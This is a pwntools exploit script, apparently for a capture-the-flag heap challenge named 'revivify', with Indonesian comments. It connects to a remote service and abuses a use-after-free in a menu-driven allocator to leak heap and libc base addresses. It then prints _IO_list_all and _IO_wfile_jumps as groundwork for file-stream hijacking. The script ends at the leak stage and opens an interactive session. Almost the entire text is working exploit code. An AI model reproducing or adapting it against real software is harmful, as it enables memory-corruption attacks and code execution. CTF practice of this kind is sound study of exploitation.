from pwn import *

context.log_level = 'info'
p = remote('103.152.242.90', 28955)
libc = ELF('./libc.so.6')

def create(idx, size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'data: ', data)

def show(idx, size):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())
    data = p.recvn(size)
    p.recvuntil(b'=== revivify ===\n')
    return data

# === RECON 1: HEAP LEAK ===
create(0, 0x20)
delete(0)
leak = show(0, 0x20)
heap_leak = u64(leak[:8])
heap_base = heap_leak << 12
log.success(f"Heap Base    : {hex(heap_base)}")

# === RECON 2: LIBC LEAK (Urutan Diperbaiki) ===
create(1, 0x500)  # 1. Buat Unsorted Bin Chunk
create(2, 0x20)   # 2. Buat Guard Chunk (Mencegah merge dengan Top Chunk)
delete(1)         # 3. Free chunk 0x500
leak_libc = show(1, 0x500)
main_arena_leak = u64(leak_libc[:8])

log.success(f"Raw Libc Leak: {hex(main_arena_leak)}")

# Hitung base libc (offset 0x21ace0 untuk GLIBC 2.35)
libc_base = main_arena_leak - 0x21ace0
log.success(f"Libc Base    : {hex(libc_base)}")

if libc_base & 0xfff == 0 and libc_base > 0:
    log.success("Libc Base VALID (Page Aligned)!")
    log.info(f"_IO_list_all    : {hex(libc_base + libc.symbols['_IO_list_all'])}")
    log.info(f"_IO_wfile_jumps : {hex(libc_base + libc.symbols['_IO_wfile_jumps'])}")
else:
    log.error("Libc Base TIDAK VALID, periksa offset!")

p.interactive()
